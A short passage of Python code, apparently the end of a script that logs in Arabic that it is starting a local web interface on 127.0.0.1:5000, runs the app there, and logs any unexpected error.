            logging.info(f"{Fore.GREEN}بدء واجهة الويب على http://127.0.0.1:5000{Style.RESET_ALL}")
            app.run(host='127.0.0.1', port=5000, use_reloader=False)
    except Exception as e:
        logging.error(f"{Fore.RED}خطأ غير متوقع: {str(e)}{Style.RESET_ALL}")
